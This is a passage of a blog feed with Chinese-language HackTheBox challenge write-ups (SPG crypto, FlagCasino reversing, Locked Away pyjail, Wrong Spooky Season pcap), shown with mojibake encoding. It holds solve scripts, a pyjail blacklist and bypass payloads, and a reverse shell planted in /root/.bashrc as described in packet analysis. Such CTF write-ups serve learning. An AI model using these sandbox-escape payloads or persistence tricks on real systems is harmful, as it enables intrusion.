æœƒç”¢ç”Ÿä¸€å€‹ 256 ä½çš„æ‘˜è¦ï¼Œé€™æœƒç”¨æ–¼ä¹‹å¾Œ AES åŠ å¯†çš„å¯†é‘°ã€‚<br>æ¥è‘—æˆ‘å€‘æœƒä½¿ç”¨ç”Ÿæˆçš„ encryption_key åˆå§‹åŒ– AES åŠ å¯†å™¨ï¼Œä¸¦é¸æ“‡ ECB æ¨¡å¼ã€‚ç„¶å¾ŒæŠŠ flag padding åˆ° 16 ä½ç¢ºä¿ AES å¯ä»¥æ­£å¸¸é‹ä½œï¼Œç„¶å¾ŒåŸ·è¡ŒåŠ å¯†å¾Œè¼¸å‡º password è·Ÿ flagã€‚</p><p>é‚£åˆ†æå®Œå¾Œé¦–å…ˆæˆ‘å€‘æœƒæƒ³å…ˆæƒ³è¾¦æ³•å¾—åˆ° master_keyï¼Œé‚£æ ¹æ“šä»–å­—æ¯è¡¨çš„å»ºç«‹æ–¹å¼æˆ‘å€‘å¯ä»¥çŸ¥é“å‰åŠè·Ÿå¾ŒåŠåˆ†åˆ¥æ˜¯ï¼š<code>abcdefghijklmnopqrstuvwxyzABCDEFGHI</code>ï¼Œ<code>JKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*</code>ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é€é password çš„æ¯ä¸€ä½åœ¨å‰åŠæˆ–æ˜¯å¾ŒåŠçŸ¥é“ master_key çš„æ¯ä¸€å€‹ bit æ˜¯ 0 é‚„æ˜¯ 1 å¦‚æ­¤å°±å¯ä»¥å¾—åˆ° master_keyï¼Œæ¥è‘—å°±æ˜¯æ­£å¸¸çš„ AES æ“ä½œã€‚</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>æœ€å¾ŒæŒ‰ç…§å‰›å‰›çš„é‚è¼¯æŠŠè…³æœ¬å¯¦ç¾å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">alph = string.ascii_letters + string.digits + <span class="string">&quot;~!@#$%^&amp;*&quot;</span></span><br><span class="line">first_half, second_half = <span class="built_in">set</span>(alph[:<span class="built_in">len</span>(alph) // <span class="number">2</span>]), <span class="built_in">set</span>(alph[<span class="built_in">len</span>(alph) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_data</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        password = f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        enc_flag = b64decode(f.readline().split(<span class="string">&quot; : &quot;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">return</span> password, enc_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_master_key</span>(<span class="params">password</span>):</span><br><span class="line">    bits = [<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> p <span class="keyword">in</span> first_half <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> p <span class="keyword">in</span> password]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(bits[::-<span class="number">1</span>]), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">master_key, enc_flag</span>):</span><br><span class="line">    encryption_key = sha256(long_to_bytes(master_key)[::-<span class="number">1</span>]).digest()</span><br><span class="line">    cipher = AES.new(encryption_key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> unpad(cipher.decrypt(enc_flag), <span class="number">16</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    password, enc_flag = load_data()</span><br><span class="line">    master_key = recover_master_key(password)</span><br><span class="line">    flag = decrypt_flag(master_key, enc_flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ python solve.py                                      â”€â•¯</span><br><span class="line">Decrypted FLAG: HTB&#123;m4ll34bl3_p4ssw0rd_g3n3r4t0r!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spg_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md" >https://github.com/hackthebox/htboo-ctf-2023/blob/main/htboo-ctf-2023/crypto/%5BVery%20Easy%5D%20SPG/README.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;é¦–å…ˆé¡Œç›®é™„çµ¦æˆ‘å€‘ &lt;code&gt;source.py&lt;/code</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="crypto" scheme="https://kazma.tw/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges FlagCasino Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/</id>
    <published>2024-11-01T09:16:21.217Z</published>
    <updated>2024-11-01T09:35:16.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>é€™æ˜¯ä¸€é¡Œé€†å‘ï¼Œå› ç‚ºç¨‹å¼ä¸é•·å°±ç›´æ¥æ”¾ä¸Šä¾†ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Bh] [rbp-5h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** WELCOME TO ROBO CASINO **]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;     ,     ,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    (\\____/)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     (_oo_)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;       (O)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     __||__    \\)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  []/______\\[] /\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / \\______/ \\/\n&quot;</span></span><br><span class="line">    <span class="string">&quot; /    /__\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(\\   /____\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*** PLEASE PLACE YOUR BETS ***]&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1D</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;input) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    srand(input);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != check[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ * INCORRECT * ]&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[ * CORRECT *]&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢æ˜¯ ida åç·¨è­¯çš„ä¸»ç¨‹å¼é‚è¼¯ï¼Œç¸½ä¹‹æˆ‘å€‘å°±æ˜¯è¦é€£çºŒè¼¸å…¥æ­£ç¢ºçš„äº‚æ•¸ç¨®å­ä¾†ç¬¦åˆ check é™£åˆ—è£¡çš„å€¼ï¼Œæ‰€ä»¥å°±æ˜¯ä¸€å€‹ flag checkerï¼Œé€™è£¡æˆ‘å€‘ä¾†æ’°å¯« exploit ä¾†ç®—å‡ºå°æ‡‰çš„äº‚æ•¸ç¨®å­ã€‚</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    libc.srand(i)</span><br><span class="line">    mapping[libc.rand()] = <span class="built_in">chr</span>(i)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">casino = ELF(<span class="string">&quot;./casino&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    val = casino.u32(casino.sym[<span class="string">&quot;check&quot;</span>] + b * <span class="number">4</span>)</span><br><span class="line">    flag += mapping[val]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>é¦–å…ˆæˆ‘å€‘è¼‰å…¥ <code>ctypes</code> è®“ python å¯ä»¥å‘¼å« C æ¨™æº–å‡½å¼åº«ä¸­çš„å‡½æ•¸ã€‚<br>ç„¶å¾Œä½¿ç”¨ ctypes.CDLL å‡½æ•¸ä¾†åŠ è¼‰ Linux çš„ C æ¨™æº–å‡½å¼åº« libc.so.6ï¼Œé€™æ¨£åŠ è¼‰å¾Œçš„ libc ç‰©ä»¶å°±å¯ä»¥ç›´æ¥å‘¼å« C æ¨™æº–åº«ä¸­çš„å‡½æ•¸ï¼Œä¾‹å¦‚é¡Œç›®ä¸­ç”¨åˆ°çš„ srand() å’Œ rand()ã€‚<br>ç„¶å¾Œæˆ‘å€‘éè¿´ ascii çš„ç¯„åœå»ºä¸€å€‹å­—å…¸ï¼Œå†ä¾†æˆ‘å€‘å¯ä»¥é€é ida è§€å¯Ÿåˆ° check é™£åˆ—è§€å¯Ÿåˆ°æœ‰ 30 å€‹ 4 bytesï¼Œæ‰€ä»¥é€™è£¡æˆ‘å€‘å¯ä»¥æŠŠ casino ç”¨ pwntools è¼‰é€²ä¾†ä¹‹å¾Œé€é u32 ä»¥åŠä¸€æ¬¡ç§»å‹•æˆ‘å€‘çš„æŒ‡é‡å››å€‹å–®ä½ä¾†æ‰¾åˆ°å°æ‡‰çš„éš¨æ©Ÿç¨®å­ï¼Œæœ€å¾Œå°å‡ºæˆ‘å€‘çš„ flagã€‚</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ file casino                                          â”€â•¯</span><br><span class="line">casino: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7618b017ef4299337610a90a0a6ccb7f9efc44a4, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/casino_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee" >https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;é€™æ˜¯ä¸€é¡Œé€†å‘ï¼Œå› ç‚ºç¨‹å¼ä¸é•·å°±ç›´æ¥æ”¾ä¸Šä¾†ï¼š&lt;/p&gt;
&lt;div </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Locked Away Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-Locked-Away-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-Locked-Away-Writeup/</id>
    <published>2024-11-01T07:38:20.786Z</published>
    <updated>2024-11-01T08:27:44.987Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h2><p>è€¶é€™é¡Œæ˜¯æœ‰è¶£çš„ pyjailã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ cat challenge/main.py                                â”€â•¯</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_chest</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;open&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&#x27;The chest lies waiting... &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(b <span class="keyword">in</span> command <span class="keyword">for</span> b <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid command!&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(command)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;You have been locked away...&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure></div><p>ç¨å¾®æ•´ç†äº†ä¸€ä¸‹é¡Œç›®çš„ä¸»é‚è¼¯å¦‚ä¸Šï¼Œç¸½ä¹‹å°±æ˜¯æœ‰å€‹ç„¡é™è¿´åœˆæœƒæŠŠ input æ‹¿å»åŸ·è¡Œ exec ä½†æ˜¯è¦ç¹é»‘åå–®ï¼Œé€™é‚Šæä¾›å¹¾ç¨®åšæ³•ï¼š</p><ol><li>é¦–å…ˆç¬¬ä¸€ç¨®æ˜¯æˆ‘å€‘å¯ä»¥é€é <code>blacklist.clear()</code> æˆ–æ˜¯ <code>blacklist = &#39;&#39;</code> å…ˆæ¸…é™¤é»‘åå–®å¾Œ call <code>open_chest()</code></li><li>å¦ä¸€ç¨®åšæ³•æ˜¯å‡è¨­ä»–åªèƒ½è¼¸å…¥ä¸€æ¬¡çš„è©±ï¼Œæˆ‘å€‘å¯ä»¥å˜—è©¦ç”¨å…¶ä»–æ–¹å¼å‘¼å« <code>open_chest()</code>ï¼Œä¾‹å¦‚ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [5]: list(b<span class="string">&#x27;open_chest&#x27;</span>)</span><br><span class="line">Out[5]: [111, 112, 101, 110, 95, 99, 104, 101, 115, 116]</span><br></pre></td></tr></table></figure></div>æˆ‘å€‘æŠŠå®ƒæ›æˆ asciiï¼Œç„¶å¾Œç”¨ä¸‹é¢çš„æ–¹å¼ä»£è¡¨ â€˜open_chestâ€™ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [6]: bytes([111, 112, 101, 110, 95, 99, 104, 101, 115, 116]).decode()</span><br><span class="line">Out[6]: <span class="string">&#x27;open_chest&#x27;</span></span><br></pre></td></tr></table></figure></div>å†ä¾†æˆ‘å€‘å¯ä»¥é€é <code>globals.get()</code> å»å‘¼å«åˆ° <code>open_chest</code> å‡½å¼ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The chest lies waiting... globals().get(bytes((<span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>)).decode())()</span><br><span class="line">HTB&#123;bL4cKl1sT?_bUt_tH4t<span class="string">&#x27;5_t0o_3asY&#125;</span></span><br></pre></td></tr></table></figure></div>Amazing!</li><li>å†ä¾†æ˜¯æˆ‘å€‘ä¹Ÿå¯ä»¥æ›å­—å‹ç›´æ¥ç¹éï¼Œåƒæ˜¯ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The chest lies waiting... ğ–”ğ–•ğ–Šğ–“_ğ–ˆğ–ğ–Šğ–˜ğ–™()</span><br><span class="line">HTB&#123;bL4cKl1sT?_bUt_tH4t<span class="string">&#x27;5_t0o_3asY&#125;</span></span><br><span class="line"><span class="string">The chest lies waiting...</span></span><br></pre></td></tr></table></figure></div></li></ol><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/locked_away_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://www.linkedin.com/pulse/hackthebox-locked-away-python-ctf-writeups-motasem-hamdan-yozjf/" >https://www.linkedin.com/pulse/hackthebox-locked-away-python-ctf-writeups-motasem-hamdan-yozjf/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://nikos-titomichelakis.medium.com/htb-business-ctf-2024-the-vault-of-hope-b06d701e0520" >https://nikos-titomichelakis.medium.com/htb-business-ctf-2024-the-vault-of-hope-b06d701e0520 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitaion&quot;&gt;&lt;a href=&quot;#Exploitaion&quot; class=&quot;headerlink&quot; title=&quot;Exploitaion&quot;&gt;&lt;/a&gt;Exploitaion&lt;/h2&gt;&lt;p&gt;è€¶é€™é¡Œæ˜¯æœ‰è¶£çš„ pyjailã€‚&lt;/p&gt;
&lt;div class=&quot;hi</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="pyjail" scheme="https://kazma.tw/tags/pyjail/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Wrong Spooky Season Writeup</title>
    <link href="https://kazma.tw/2024/10/31/HackTheBox-Challenges-Wrong-Spooky-Season-Writeup/"/>
    <id>https://kazma.tw/2024/10/31/HackTheBox-Challenges-Wrong-Spooky-Season-Writeup/</id>
    <published>2024-10-31T11:26:23.920Z</published>
    <updated>2024-10-31T11:57:15.500Z</updated>
    
    <content type="html"><![CDATA[<p>é€™é¡Œçµ¦æˆ‘å€‘å°åŒ…åˆ†æï¼Œå¯ä»¥ç·´ç¿’ä¸€ä¸‹ wireshark çš„ç”¨æ³•ã€‚<br>é¦–å…ˆæˆ‘å€‘å¯ä»¥å…ˆçœ‹ Statistics -&gt; Protocol Hierarchy çœ‹ä¸€ä¸‹æœ‰å“ªäº›å”è­°ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_hierarchy.png"                      alt="hierarchy"                ><br>æˆ‘å€‘é¦–å…ˆé—œå¿ƒçš„æ˜¯å…¶ä¸­çš„ dataï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥æœå°‹ data çš„å°åŒ…ï¼Œæˆ–æ˜¯å³éµ Apply as Filter -&gt; Selectedï¼Œç„¶å¾Œæˆ‘å€‘ Follow TCP stream å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„ç•«é¢ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_b64.png"                      alt="b64"                ><br>æˆ‘å€‘å¯ä»¥çœ‹åˆ°é§­å®¢åŸ·è¡Œäº†ä¸€ç³»åˆ—çš„æŒ‡ä»¤æ“ä½œå…¶ä¸­åŒ…æ‹¬æŠŠ reverse shell å¯«å…¥ &#x2F;root&#x2F;.bashrc é€™æ¨£ä¸‹æ¬¡é–‹å•Ÿ shell å°±æœƒè§¸ç™¼ï¼Œå…¶ä¸­é‚„æœ‰éš±è—è¨Šæ¯ï¼Œæˆ‘å€‘æŠŠå®ƒå¼„å›ä¾†å°±æœƒçœ‹åˆ° flag äº†ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ <span class="built_in">echo</span> <span class="string">&quot;==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS&quot;</span> | rev | <span class="built_in">base64</span> -d                            â”€â•¯</span><br><span class="line">HTB&#123;j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é€™é¡Œçµ¦æˆ‘å€‘å°åŒ…åˆ†æï¼Œå¯ä»¥ç·´ç¿’ä¸€ä¸‹ wireshark çš„ç”¨æ³•ã€‚&lt;br&gt;é¦–å…ˆæˆ‘å€‘å¯ä»¥å…ˆçœ‹ Statistics -&amp;gt; Protocol Hierarchy çœ‹ä¸€ä¸‹æœ‰å“ªäº›å”è­°ï¼š&lt;br&gt;&lt;img  
                     lazyload
       </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="pcap" scheme="https://kazma.tw/tags/pcap/"/>
    
  </entry>
  
  <entry>
